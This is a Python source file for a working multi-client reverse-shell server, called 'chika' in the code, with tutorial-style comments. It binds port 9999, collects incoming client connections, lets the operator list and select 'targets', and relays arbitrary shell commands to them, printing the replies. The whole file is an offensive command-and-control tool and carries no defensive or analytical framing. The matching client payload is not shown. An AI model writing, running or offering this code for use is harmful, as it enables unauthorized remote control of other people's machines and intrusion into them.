import socket
import sys
import threading
from queue import Queue
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
# 1st Thread Will Be Responsible For Part Of Program Handling Connections Allowing Bunch Of Clients To Connect And Store Them In A List
# 2nd Thread Will Be Responsible For Sending Out Commands To Choosen Connection Over The Network

queue = Queue()

all_connections = [] # Connections (For Computers)
all_addresses = [] # IP Addr & Port (For Humans)



# Create A Socket (It helps in connection of two computers)
def create_socket():
	try:
		global host
		global port
		global s
		host = '' # For Self 
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("ERROR IN CREATING SOCKET : " + str(msg))

# Bind Socket To Port And Wait For Connection From Client
def bind_socket():
	try:
		global host
		global port
		global s
		print("BINDING SOCKET TO PORT : " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("ERROR IN BINDING SOCKET : " + str(msg) + " RETRYING...")
		time.sleep(5)
		bind_socket()

# Accept Connections From Multiple Clients And Save To List
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			conn, address = s.accept()
			conn.setblocking(1) # Don't Want Any Timeout
			all_connections.append(conn)
			all_addresses.append(address)
			print("CONNECTION HAS BEEN ESTABLISHED | IP " + str(address[0]) + " | PORT " + str(address[1]))
		except:
			print("ERROR ACCEPTING CONNECTION")
			break

# Interactive Prompt For Sending Commands Remotely
def start_chika():
	time.sleep(2)
	while True:
		cmd = input("chika>")
		if cmd == "list":
			list_connections()
		elif "select" in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
			else:
				print("TARGET SEEM TO BE DISSCONNECTED")
		elif cmd == "help":
			help()
		elif cmd == "quit":
			s.close()
			exit(0)
			break
		else:
			print("COMMAND NOT RECOGNISED")
			print("USE help")
			
			

def help():
	print("MANUAL FOR CHIKA")
	print("USE : ")
	print("list = For Listing All Connections")
	print("select x = For Selecting Connection x")
	print("quit = For Quitting Chika")
			
			
# Display All Current Connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(" "))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '      ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) + '\n'
	print('**************CONNECTIONS**************')
	print('Client ' + 'IP         ' + 'PORT')
	print(results)
	
# Select A Target
def get_target(cmd):
	try:
		target = cmd.split(' ')[1]
		target = int(target)
		conn = all_connections[target]
		print("YOU ARE NOW CONNECTED TO " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + ">", end="")
		return conn
	except:
		print("NOT A VALID SELECTION")
		return None
		

# Connect With Remote Target Client
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if cmd == "quit":
				break
			if len(cmd) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), "utf-8")
				print(client_response, end="")
		except:
			print("CONNECTION WAS LOST")
			break

# Create Worker Threads

def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target = work)
		t.daemon = True # Set That This Thread(which is our mini program) Is Gonna Die When Our Main Program Exits
		t.start()

# Do The Next Job In The Queue (One Handle Connections, Second Send Commands)
def work():
	while True:
		x = queue.get()
		if x == 1:
			create_socket()
			bind_socket()
			accept_connections()
		if x == 2:
			start_chika()
		queue.task_done()
		
# Each list item is a new job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()
	
def main():
	create_workers()
	create_jobs()

main()












			
